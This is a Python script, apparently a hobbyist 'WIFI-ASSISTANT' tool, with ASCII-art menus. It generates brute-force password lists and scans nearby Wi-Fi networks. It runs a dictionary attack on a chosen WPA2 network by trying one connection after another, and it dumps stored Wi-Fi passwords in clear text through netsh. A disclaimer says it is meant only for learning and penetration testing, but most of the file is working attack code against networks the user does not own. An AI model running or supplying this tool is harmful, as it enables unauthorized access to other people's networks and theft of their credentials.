import os
import time
import pywifi
import subprocess
import shutil
import urllib.request
import itertools as its
from pywifi import *
from subprocess import check_output

os.system("cls")
mogadame =("""
░██╗░░░░░░░██╗██╗███████╗██╗░░░░░░░█████╗░░██████╗░██████╗██╗░██████╗████████╗░█████╗░███╗░░██╗████████╗
░██║░░██╗░░██║██║██╔════╝██║░░░░░░██╔══██╗██╔════╝██╔════╝██║██╔════╝╚══██╔══╝██╔══██╗████╗░██║╚══██╔══╝
░╚██╗████╗██╔╝██║█████╗░░██║█████╗███████║╚█████╗░╚█████╗░██║╚█████╗░░░░██║░░░███████║██╔██╗██║░░░██║░░░
░░████╔═████║░██║██╔══╝░░██║╚════╝██╔══██║░╚═══██╗░╚═══██╗██║░╚═══██╗░░░██║░░░██╔══██║██║╚████║░░░██║░░░
░░╚██╔╝░╚██╔╝░██║██║░░░░░██║░░░░░░██║░░██║██████╔╝██████╔╝██║██████╔╝░░░██║░░░██║░░██║██║░╚███║░░░██║░░░
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░
                                                                             <<< Coded By MR-MELFEX >>>

1) Creating a password list                     2) Crack Wifi
3) Saved Wi-Fis                                 4) Check for Update 
5) Help and Questions                           6) Abut From MR-MELFEX

----------------------------------------------------------------------------------

Hello dear, welcome.
To continue working select one of the options above and send it.
Meanwhile, you can visit the "HELP" module to see and how to work with this script.
Yours truly, < MR-MELFEX > :)""")

print(mogadame)
melfex = 0

def mlfx() :
    while melfex == 0 :
        os.system("cls")
        print(mogadame)
        vorode = input("--->>>  ")
        if vorode == "1" :
            os.system('cls')
            print("""
██████╗░░█████╗░░██████╗░██████╗░██╗░░░░░░░██╗░█████╗░██████╗░██████╗░░░░░░░██╗░░░░░██╗░██████╗████████╗
██╔══██╗██╔══██╗██╔════╝██╔════╝░██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗░░░░░░██║░░░░░██║██╔════╝╚══██╔══╝
██████╔╝███████║╚█████╗░╚█████╗░░╚██╗████╗██╔╝██║░░██║██████╔╝██║░░██║█████╗██║░░░░░██║╚█████╗░░░░██║░░░
██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗░░████╔═████║░██║░░██║██╔══██╗██║░░██║╚════╝██║░░░░░██║░╚═══██╗░░░██║░░░
██║░░░░░██║░░██║██████╔╝██████╔╝░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██████╔╝░░░░░░███████╗██║██████╔╝░░░██║░░░
╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═════╝░░░░░░░╚══════╝╚═╝╚═════╝░░░░╚═╝░░░
                                                                            <<< Coded BY MR-MELFEX >>>

Welcome to the create password list area.
You can create a file with your name and extension here and create passwords

However, do you want to proceed with the process? [y/n]""")
            vorode_list = input("--->>>  ")
            if vorode_list.lower() == "y" :
                print("\n\nWhat do your passwords consist of? You can use numbers, letters, hashtags, etc")
                renj = str(input("--->>>  "))
                print("\n\nSpecify how many digits your passwords should be")
                tedad = int(input("--->>>  "))
                print("\n\nChoose a name for the file")
                file = str(input("--->>>  "))
                file2 = its.product(renj,repeat=tedad)
                dic = open("%s.txt" %(file),"a")
                print("\n\n")
                for i in range(10):
                    time.sleep(1)
                    print('\rCreating file. Please wait.. [' + str(9 - i) + ']', end='')
                print("\n\nThe file was created successfully! Do you want to put passwords in the file? {y/n}")
                soal1 = input("--->>>  ")
                if soal1.lower() == "y":
                        print("\n\nGood.The operation is in progress.\n\n")
                        for i in range(10):
                            time.sleep(1)
                            print('\rPlease be Patient..[' + str(9 - i) + ']', end='')
                        for i in file2 :
                            dic.write("".join(i))
                            dic.write("".join("\n"))
                        dic.close()
                        print("\n\nThe operation was successfully completed! You are now able to use the password list!\n\n")
                elif soal1.lower() == "n" :
                    print("\\n\nOk leaving..\n\n")
                    os.system("cls")
                    print(mogadame)
                    mlfx()
                else:
                    os.system("cls")
                    print(mogadame)
                    mlfx()
                return
                break
            elif vorode_list.lower() == "n":
                os.system("cls")
                print(mogadame)
                mlfx()
            else:
                os.system("cls")
                print(mogadame)
                mlfx()
        elif vorode == "6" :
            os.system("cls")
            print("""
███╗░░░███╗██████╗░░░░░░░███╗░░░███╗███████╗██╗░░░░░███████╗███████╗██╗░░██╗
████╗░████║██╔══██╗░░░░░░████╗░████║██╔════╝██║░░░░░██╔════╝██╔════╝╚██╗██╔╝
██╔████╔██║██████╔╝█████╗██╔████╔██║█████╗░░██║░░░░░█████╗░░█████╗░░░╚███╔╝░
██║╚██╔╝██║██╔══██╗╚════╝██║╚██╔╝██║██╔══╝░░██║░░░░░██╔══╝░░██╔══╝░░░██╔██╗░
██║░╚═╝░██║██║░░██║░░░░░░██║░╚═╝░██║███████╗███████╗██║░░░░░███████╗██╔╝╚██╗
╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝╚══════╝╚══════╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝


Hi Frind!
I am Farshad. Security student and web designer and Telegram bot From Iran :)

You Can Find Me in : 

InstaGram --->>> www.instagram.com/DevFrshd
TelleGram --->>> T.me/MRMLFX
GitHub --->>> Mr-Melffex
Contact --->>> MelfexMr@Gmail.com

*** Bahck To Main Page >> [b]""")
            info_in = input("--->>>  ")
            if info_in.lower == "b" :
                mlfx()
            else:
                print("Command Not Found")
                mlfx()
        elif vorode == "3" :
            os.system("cls")
            print("""

░██╗░░░░░░░██╗██╗███████╗██╗░░░░░░░██████╗░█████╗░██╗░░░██╗███████╗██████╗░
░██║░░██╗░░██║██║██╔════╝██║░░░░░░██╔════╝██╔══██╗██║░░░██║██╔════╝██╔══██╗
░╚██╗████╗██╔╝██║█████╗░░██║█████╗╚█████╗░███████║╚██╗░██╔╝█████╗░░██║░░██║
░░████╔═████║░██║██╔══╝░░██║╚════╝░╚═══██╗██╔══██║░╚████╔╝░██╔══╝░░██║░░██║
░░╚██╔╝░╚██╔╝░██║██║░░░░░██║░░░░░░██████╔╝██║░░██║░░╚██╔╝░░███████╗██████╔╝
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═════╝░
                                                 <<< Coded BY MR-MELFEX >>>""")
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            for i in profiles:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                try:
                    print ("{:<30}|  {:<}".format(i, results[0]))
                except IndexError:
                    print ("{:<30}|  {:<}".format(i, ""))
            input("")

        elif vorode == "2" :
            os.system("cls")
            def wifi_scan():
                wifi = pywifi.PyWiFi()
                interface = wifi.interfaces()[0]
                print("""
░██╗░░░░░░░██╗██╗███████╗██╗░░░░░░░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
░██║░░██╗░░██║██║██╔════╝██║░░░░░░██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
░╚██╗████╗██╔╝██║█████╗░░██║█████╗██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
░░████╔═████║░██║██╔══╝░░██║╚════╝██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
░░╚██╔╝░╚██╔╝░██║██║░░░░░██║░░░░░░╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
                                                            <<< Coded By Mr-Melfex >>>

Welcome to Wifa crack and penetration test area.
You will be able to crack Wi-Fi by creating a password list and this module

NOTE >>> This script is written only for learning and penetration testing,
malicious use will be the responsibility of the person!!

However, do you want to proceed with the process? [y/n]""")
                vorode_wifi = input("--->>>  ")
                if vorode_wifi.lower() == "y" :
                    vorod = 0
                    interface.scan()
                    print("\n\n")
                    for i in range(10):
                        time.sleep(1)
                        print('\rScanning nearby Wi-Fis. be patient [' + str(9 - i), end=']')
                    print("\n\n")
                    print('<<< WIFI LIST >>>'.center(35, '-'))
                    print('\r{:11}{:17}{}'.format('Num', 'Strength', 'Name'))
                    bss = interface.scan_results()
                    wifi_name_set = set()
                    for w in bss:
                        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
                        wifi_name_set.add(wifi_name_and_signal)
                    wifi_name_list = list(wifi_name_set)
                    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
                    num = 0
                    while num < len(wifi_name_list):
                        print("\n")
                        print('\r{:<11d}{:<17d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
                        num += 1
                    print('-' * 38)
                    return wifi_name_list
                elif vorode_wifi == "n" :
                    print("\n\nOk, Pls Wite...")
                    os.system("cls")
                    print(mogadame)
                    mlfx()
                else:
                    print("\n\nEror,Comend Not Fund..!")
            def wifi_password_crack(wifi_name):
                print("\n\nPlease enter the name and extension of the password list file")
                wifi_dic_path = input("--->>>  ")
                with open(wifi_dic_path, 'r') as f:
                    for pwd in f:
                        pwd = pwd.strip('\n')
                        wifi = pywifi.PyWiFi()
                        interface = wifi.interfaces()[0]
                        interface.disconnect()
                        while interface.status() == 4:
                            pass
                        profile = pywifi.Profile()
                        profile.ssid = wifi_name
                        profile.auth = const.AUTH_ALG_OPEN
                        profile.akm.append(const.AKM_TYPE_WPA2PSK)
                        profile.cipher = const.CIPHER_TYPE_CCMP
                        profile.key = pwd
                        interface.remove_all_network_profiles()
                        tmp_profile = interface.add_network_profile(profile)
                        interface.connect(tmp_profile)
                        start_time = time.time()
                    while time.time() - start_time < 1.5:
                        if interface.status() == 4:
                            print(f'\rSuccessful crack！Password：{pwd}')
                            exit(0)
                        else:
                            print(f'\rTesting with {pwd}', end='')
            def main():
                exit_flag = 0
                target_num = -1
                while not exit_flag:     
                    try:
                        wifi_list = wifi_scan()
                        choose_exit_flag = 0
                        while not choose_exit_flag:
                            try:
                                print("\n\nPlease choose a target wifi")
                                target_num = int(input("--->>> "))
                                if target_num in range(len(wifi_list)):
                                    while not choose_exit_flag:
                                        try:
                                            print("\n\nThe chosen target wifi，Sure? [y/n]")
                                            choose = str(input(f"--->>>  "))
                                            if choose.lower() == 'y':
                                                choose_exit_flag = 1
                                            elif choose.lower() == 'n':
                                                break
                                            else:
                                                print('only Y/N pls! o(*￣︶￣*)o')
                                        except ValueError:
                                            print('only Y/N pls! o(*￣︶￣*)o')
                                    if choose_exit_flag == 1:
                                        break
                                    else:
                                        print('Please choose a target wifi: ')
                            except ValueError:
                                print('Please only enter a number: ')
                        wifi_password_crack(wifi_list[target_num][1])
                        print('-' * 38)
                        exit_flag = 1
                    except Exception as e:
                        print(e)
                        raise e
            
            if __name__ == '__main__':
                main()

        elif vorode == "5" :
            os.system("cls")
            print("""
██╗░░██╗███████╗██╗░░░░░██████╗░░░░░░░░██████╗░██╗░░░██╗███████╗░██████╗████████╗██╗░█████╗░███╗░░██╗░██████╗
██║░░██║██╔════╝██║░░░░░██╔══██╗░░░░░░██╔═══██╗██║░░░██║██╔════╝██╔════╝╚══██╔══╝██║██╔══██╗████╗░██║██╔════╝
███████║█████╗░░██║░░░░░██████╔╝█████╗██║██╗██║██║░░░██║█████╗░░╚█████╗░░░░██║░░░██║██║░░██║██╔██╗██║╚█████╗░
██╔══██║██╔══╝░░██║░░░░░██╔═══╝░╚════╝╚██████╔╝██║░░░██║██╔══╝░░░╚═══██╗░░░██║░░░██║██║░░██║██║╚████║░╚═══██╗
██║░░██║███████╗███████╗██║░░░░░░░░░░░░╚═██╔═╝░╚██████╔╝███████╗██████╔╝░░░██║░░░██║╚█████╔╝██║░╚███║██████╔╝
╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░░░░░░░░░░░░░╚═╝░░░░╚═════╝░╚══════╝╚═════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═════╝░



Welcome to the help and questions section.

Menu 1 >>> In this part, you will be able to create a password list to crack Wi-Fi, etc.,
by choosing the range of numbers in the first part, the number of password digits in the second part, and the file name in the third part.

Menu 2 >>> In this section, you will be able to attack your nearby WiFi.,
In this way, after scanning Wi-Fi, you enter the name of the password list and wait for cracking

Menu 3 >>> With this command, you will be able to see saved Wi-Fi passwords in your system.,
To do this, you don't need to do anything special, but after selecting the module, the list will be displayed for you

Menu 4 >>> With this command, your source will be updated in case of an update by me

Menu 6 >>> You can see my biography here

*** Contact Me --->>> MelfexMr@Gmail.com

***** Back To Main Page >> [b]""")
            info_hel = input("--->>>  ")
            if info_hel.lower == "b" :
                mlfx()
            else:
                print("Command Not Found")
                mlfx()
        elif vorode == "4" :
            print("""

░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗░░░░░░██╗░░░██╗██████╗░██████╗░░█████╗░████████╗███████╗
██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝░░░░░░██║░░░██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝
██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗██║░░░██║██████╔╝██║░░██║███████║░░░██║░░░█████╗░░
██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░╚════╝██║░░░██║██╔═══╝░██║░░██║██╔══██║░░░██║░░░██╔══╝░░
╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗░░░░░░╚██████╔╝██║░░░░░██████╔╝██║░░██║░░░██║░░░███████╗
░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝░░░░░░░╚═════╝░╚═╝░░░░░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝""")
            #version = urllib.request.urlopen('').read().decode('utf8').splitlines()[0]
            #link = ""
            #path = ""

            #if version == "1.1" :
                #print("\n\nNo available Updates\n\n")
                #print("Back To Main Page >> [b]")
                #vorode_up = input("--->>>  ")
            #else:
                #print('\n\nUpdate available. Update now? [y/n]')
                #vorode_up2 = input("--->>>  ")
                #if vorode_up2.lower() == "y" :
                    #print('\nDownloading Update..')
			#urllib.request.urlretrieve(link, path)
			#print('\nUnpacking archive...')
			#shutil.unpack_archive(path, 'Updated Version ' + version)
			#os.remove(path)
			#time.sleep(3)
			#print("\nInstall Update Successful.\n** Back To Main Page >> [b]")
			#vorode_up3 = input("--->>>  ")
			#if vorode_up3.lower() == "b" :
                         #   os.system("cls")
                            #mlfx()
                        #else:
                            #mlfx()
        else:
            os.system("cls")
            print("""
███████╗██████╗░██████╗░░█████╗░██████╗░
██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
█████╗░░██████╔╝██████╔╝██║░░██║██████╔╝
██╔══╝░░██╔══██╗██╔══██╗██║░░██║██╔══██╗
███████╗██║░░██║██║░░██║╚█████╔╝██║░░██║
╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

Not Found Command!Wite 10 sanya and Try again..
""")
            for i in range(10):
                        time.sleep(1)
                        print('\rpls wait [' + str(9 - i), end=']')
            mlfx()
            
mlfx()



